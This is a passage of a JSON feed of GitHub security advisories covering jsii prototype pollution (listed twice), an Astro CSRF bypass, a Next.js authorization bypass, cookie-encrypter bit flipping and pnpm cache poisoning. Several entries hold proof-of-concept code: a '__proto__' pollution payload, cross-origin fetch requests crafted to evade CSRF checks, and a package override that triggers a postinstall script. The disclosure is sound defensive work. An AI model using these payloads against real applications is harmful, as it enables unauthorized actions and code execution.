AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>\n<p>[1] <a href=\"https://learn.snyk.io/lesson/prototype-pollution/\">https://learn.snyk.io/lesson/prototype-pollution/</a></p>\n<p>[2] <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">https://aws.amazon.com/security/issue-reporting</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2\">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.4.46\">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.5.15\">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.6.4\">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.7.3\">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m56h-5xx3-2jc2\">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m56h-5xx3-2jc2",
            "title": "[jsii] Prototype pollution in jsii.configureCategories",
            "date_modified": "2024-12-18T15:50:11.000Z",
            "date_published": "2024-12-18T15:50:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m56h-5xx3-2jc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.\nWhen loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named \"category\" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named \"category\", even if it shouldn't. </p>\n<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>\n<blockquote>\n<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>\n</blockquote>\n<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-js\">const jsii = require('jsii');\n\n// prints 'undefined'\nconsole.log(JSON.stringify({}.category))\n\n// calling 'configureCategories' with user input\njsii.configureCategories(JSON.parse('{\"__proto__\": \"user-input\"}'))\n\n// from this point onwards, every single object literal in the program\n// will contain the 'category' key, with user controlled value\nconsole.log(JSON.stringify({}.category)) // prints 'user-input'\n\n\n// this can affect the execution of the main program in case it also makes \n// use of an object key called 'category'. for example, if the main programs \n// happens to have code like this:\n\nconst x = {} // some object in the main program (not necessarily empty)\n\nif (x.category) {\n  // this block will always be executed, effectively \n  // changing the behavior of the main program.\n  console.log('Do something')\n} else {\n  console.log('Do something else')\n}\n</code></pre>\n<p>For more information about javascript prototype pollution, see [1].</p>\n<h2 id=\"patches\">Patches</h2>\n<p>A patch is included in versions <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.7.3\">5.7.3</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.6.4\">5.6.4</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.5.15\">5.5.15</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.4.46\">5.4.46</a></p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>\n<h2 id=\"references\">References</h2>\n<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>\n<p>[1] <a href=\"https://learn.snyk.io/lesson/prototype-pollution/\">https://learn.snyk.io/lesson/prototype-pollution/</a></p>\n<p>[2] <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">https://aws.amazon.com/security/issue-reporting</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2\">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.4.46\">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.5.15\">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.6.4\">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.7.3\">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m56h-5xx3-2jc2\">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m56h-5xx3-2jc2",
            "title": "[jsii] Prototype pollution in jsii.configureCategories",
            "date_modified": "2024-12-18T15:50:11.000Z",
            "date_published": "2024-12-18T15:50:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m56h-5xx3-2jc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A bug in Astro’s CSRF-protection middleware allows requests to bypass CSRF checks.</p>\n<h3 id=\"details\">Details</h3>\n<p>When the <code>security.checkOrigin</code> configuration option is set to <code>true</code>, Astro middleware will perform a CSRF check. (Source code: <a href=\"https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts\">https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts</a>)</p>\n<p>For example, with the following Astro configuration:</p>\n<pre><code class=\"language-js\">// astro.config.mjs\nimport { defineConfig } from 'astro/config';\nimport node from '@astrojs/node';\n\nexport default defineConfig({\n    output: 'server',\n    security: { checkOrigin: true },\n    adapter: node({ mode: 'standalone' }),\n});\n</code></pre>\n<p>A request like the following would be blocked if made from a different origin:</p>\n<pre><code class=\"language-js\">// fetch API or &lt;form action=\"https://test.example.com/\" method=\"POST\"&gt;\nfetch('https://test.example.com/', {\n    method: 'POST',\n    credentials: 'include',\n    body: 'a=b',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n});\n// =&gt; Cross-site POST form submissions are forbidden\n</code></pre>\n<p>However, a vulnerability exists that can bypass this security.</p>\n<h4 id=\"pattern-1-requests-with-a-semicolon-after-the-content-type\">Pattern 1: Requests with a semicolon after the <code>Content-Type</code></h4>\n<p>A semicolon-delimited parameter is allowed after the type in <code>Content-Type</code>.</p>\n<p>Web browsers will treat a <code>Content-Type</code> such as <code>application/x-www-form-urlencoded; abc</code> as a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests\">simple request</a> and will not perform preflight validation. In this case, CSRF is not blocked as expected.</p>\n<pre><code class=\"language-js\">fetch('https://test.example.com', {\n    method: 'POST',\n    credentials: 'include',\n    body: 'test',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded; abc' },\n});\n// =&gt; Server-side functions are executed (Response Code 200).\n</code></pre>\n<h4 id=\"pattern-2-request-without-content-type-header\">Pattern 2: Request without <code>Content-Type</code> header</h4>\n<p>The <code>Content-Type</code> header is not required for a request. The following examples are sent without a <code>Content-Type</code> header, resulting in CSRF.</p>\n<pre><code class=\"language-js\">// Pattern 2.1 Request without body\nfetch('http://test.example.com', { method: 'POST', credentials: 'include' });\n\n// Pattern 2.2 Blob object without type\nfetch('https://test.example.com', {\n    method: 'POST',\n    credentials: 'include',\n    body: new Blob(['a=b'], {}),\n});\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Bypass CSRF protection implemented with CSRF middleware.</p>\n<blockquote>\n<p>[!Note]\nEven with <code>credentials: 'include'</code>, browsers may not send cookies due to third-party cookie blocking. This feature depends on the browser version and settings, and is for privacy protection, not as a CSRF measure.</p>\n</blockquote>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/withastro/astro/security/advisories/GHSA-c4pw-33h3-35xw\">https://github.com/withastro/astro/security/advisories/GHSA-c4pw-33h3-35xw</a></li>\n<li><a href=\"https://github.com/withastro/astro/commit/e7d14c374b9d45e27089994a4eb72186d05514de\">https://github.com/withastro/astro/commit/e7d14c374b9d45e27089994a4eb72186d05514de</a></li>\n<li><a href=\"https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts\">https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56140\">https://nvd.nist.gov/vuln/detail/CVE-2024-56140</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests\">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c4pw-33h3-35xw\">https://github.com/advisories/GHSA-c4pw-33h3-35xw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c4pw-33h3-35xw",
            "title": "[astro] Atro CSRF Middleware Bypass (security.checkOrigin)",
            "date_modified": "2024-12-18T21:52:49.000Z",
            "date_published": "2024-12-18T15:02:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c4pw-33h3-35xw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If a Next.js application is performing authorization in middleware based on pathname, it was possible for this authorization to be bypassed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue was patched in Next.js <code>14.2.15</code> and later.</p>\n<p>If your Next.js application is hosted on Vercel, this vulnerability has been automatically mitigated, regardless of Next.js version.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no official workarounds for this vulnerability.</p>\n<h4 id=\"credits\">Credits</h4>\n<p>We'd like to thank <a href=\"http://github.com/tyage\">tyage</a> (GMO CyberSecurity by IERAE) for responsible disclosure of this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-7gfc-8cq8-jh5f\">https://github.com/vercel/next.js/security/advisories/GHSA-7gfc-8cq8-jh5f</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/1c8234eb20bc8afd396b89999a00f06b61d72d7b\">https://github.com/vercel/next.js/commit/1c8234eb20bc8afd396b89999a00f06b61d72d7b</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51479\">https://nvd.nist.gov/vuln/detail/CVE-2024-51479</a></li>\n<li><a href=\"https://github.com/vercel/next.js/releases/tag/v14.2.15\">https://github.com/vercel/next.js/releases/tag/v14.2.15</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7gfc-8cq8-jh5f\">https://github.com/advisories/GHSA-7gfc-8cq8-jh5f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7gfc-8cq8-jh5f",
            "title": "[next] Next.js authorization bypass vulnerability",
            "date_modified": "2024-12-19T15:04:24.000Z",
            "date_published": "2024-12-17T15:09:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7gfc-8cq8-jh5f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>due to a weakness in the encryption method used in cookie-encrypter an attack can use the world visible IV to edit encrypted cookies without decrypting the cookie itself. This is known as an AES CBC bit flipping attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53441\">https://nvd.nist.gov/vuln/detail/CVE-2024-53441</a></li>\n<li><a href=\"https://gist.github.com/mathysEthical/f45f1503f87381090e38a33c50eec971\">https://gist.github.com/mathysEthical/f45f1503f87381090e38a33c50eec971</a></li>\n<li><a href=\"https://mathys.reboux.pro/CVE/2024/53441\">https://mathys.reboux.pro/CVE/2024/53441</a></li>\n<li><a href=\"https://github.com/ebourmalo/cookie-encrypter/issues/9\">https://github.com/ebourmalo/cookie-encrypter/issues/9</a></li>\n<li><a href=\"https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode\">https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h63v-hw6g-x8hp\">https://github.com/advisories/GHSA-h63v-hw6g-x8hp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h63v-hw6g-x8hp",
            "title": "[cookie-encrypter] Bit flip attack vulnerability in cookie-encrypter",
            "date_modified": "2024-12-12T15:31:49.000Z",
            "date_published": "2024-12-09T21:31:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h63v-hw6g-x8hp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>pnpm seems to mishandle overrides and global cache:</p>\n<ol>\n<li>Overrides from one workspace leak into npm metadata saved in global cache</li>\n<li>npm metadata from global cache affects other workspaces</li>\n<li>installs by default don't revalidate the data (including on first lockfile generation)</li>\n</ol>\n<p>This can make workspace A (even running with <code>ignore-scripts=true</code>) posion global cache and execute scripts in workspace B</p>\n<p>Users generally expect <code>ignore-scripts</code> to be sufficient to prevent immediate code execution on install (e.g. when the tree is just repacked/bundled without executing it).</p>\n<p>Here, that expectation is broken</p>\n<h3 id=\"details\">Details</h3>\n<p>See PoC.</p>\n<p>In it, overrides from a single run of A get leaked into e.g. <code>~/Library/Caches/pnpm/metadata/registry.npmjs.org/rimraf.json</code> and persistently affect all other projects using the cache</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Postinstall code used in PoC is benign and can be inspected in <a href=\"https://www.npmjs.com/package/ponyhooves?activeTab=code\">https://www.npmjs.com/package/ponyhooves?activeTab=code</a>, it's just a <code>console.log</code></p>\n<ol>\n<li>Remove store and cache\nOn mac: <code>rm -rf ~/Library/Caches/pnpm ~/Library/pnpm/store</code>\nThis step is not required in general, but we'll be using a popular package for PoC that's likely cached</li>\n<li>Create <code>A/package.json</code>:<pre><code class=\"language-json\">{\n  \"name\": \"A\",\n  \"pnpm\": { \"overrides\": { \"rimraf&gt;glob\": \"npm:ponyhooves@1\" } },\n  \"dependencies\": { \"rimraf\": \"6.0.1\" }\n}\n</code></pre>\nInstall it with <code>pnpm i --ignore-scripts</code> (the flag is not required, but the point of the demo is to show that it doesn't help)</li>\n<li>Create <code>B/package.json</code>:<pre><code class=\"language-json\">{\n  \"name\": \"B\",\n  \"dependencies\": { \"rimraf\": \"6.0.1\" }\n}\n</code></pre>\nInstall it with <code>pnpm i</code></li>\n</ol>\n<p>Result:</p>\n<pre><code class=\"language-console\">Packages: +3\n+++\nProgress: resolved 3, reused 3, downloaded 0, added 3, done\nnode_modules/.pnpm/ponyhooves@1.0.1/node_modules/ponyhooves: Running postinstall script, done in 51ms\n\ndependencies:\n+ rimraf 6.0.1\n\nDone in 1.4s\n</code></pre>\n<p>Also, that code got leaked into another project and it's lockfile now! </p>\n<h3 id=\"impact\">Impact</h3>\n<p>Global state integrity is lost via operations that one would expect to be secure, enabling subsequently running arbitrary code execution on installs</p>\n<p>As a work-around, use separate cache and store dirs in each workspace</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r\">https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53866\">https://nvd.nist.gov/vuln/detail/CVE-2024-53866</a></li>\n<li><a href=\"https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743\">https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vm32-9rqf-rh3r\">https://github.com/advisories/GHSA-vm32-9rqf-rh3r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vm32-9rqf-rh3r",
            "title": "[pnpm] pnpm no-script global cache poisoning via overrides / `ignore-scripts` evasion",
            "date_modified": "2024-12-10T22:42:44.000Z",
            "date_published": "2024-12-10T22:42:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vm32-9rqf-rh3r"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}